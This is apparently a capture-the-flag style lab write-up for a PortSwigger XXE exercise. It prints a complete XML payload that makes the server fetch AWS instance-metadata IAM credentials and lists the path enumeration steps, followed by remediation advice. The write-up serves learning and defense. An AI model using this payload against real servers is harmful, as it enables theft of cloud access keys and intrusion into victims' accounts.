Difficulty: Apprentice
Status: ✅ Solved
Vulnerability
XXE used to make server-side requests to internal endpoints.
AWS EC2 metadata endpoint accessible at 169.254.169.254.
Final Payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
Steps

Started with http://169.254.169.254/
Enumerated path step by step
latest/ → meta-data/ → iam/ → security-credentials/ → admin
Final response contained IAM credentials JSON
AccessKeyId and SecretAccessKey extracted

Why It Works
Server makes HTTP request on attacker's behalf.
AWS metadata endpoint trusted internal requests.
IAM credentials exposed through iterative enumeration.
Fix
Disable external entities.
Block server-side requests to cloud metadata endpoints.
Implement IMDSv2 on AWS instances.

---

**File: PortSwigger/XXE/03-xinclude-attack.md**
